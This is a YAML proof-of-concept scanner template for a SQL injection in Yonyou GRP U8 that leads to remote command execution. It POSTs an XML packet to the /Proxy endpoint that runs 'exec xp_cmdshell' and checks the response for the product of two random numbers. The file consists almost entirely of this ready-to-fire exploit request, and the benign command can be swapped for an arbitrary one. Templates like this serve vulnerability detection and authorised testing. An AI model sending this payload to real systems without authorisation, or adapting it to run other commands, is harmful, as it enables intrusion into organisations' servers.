id: poc-yaml-yonyou-grp-u8-sqli-to-rce
info:
  name: Yonyou Grp U8 To Rce SQL注入漏洞
  severity: medium
  tags:
  - sql-injection
  finger: Yonyou
  reference: []
  description: null
variables:
  r1: random_int(1000, 9999)
  r2: random_int(1000, 9999)
transport: http
requests:
- method: POST
  path: /Proxy
  headers: {}
  data: cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA
    format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA
    format="text">exec xp_cmdshell 'set/A {{.r1}}*{{.r2}}'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, r1 * r2)
  output: []
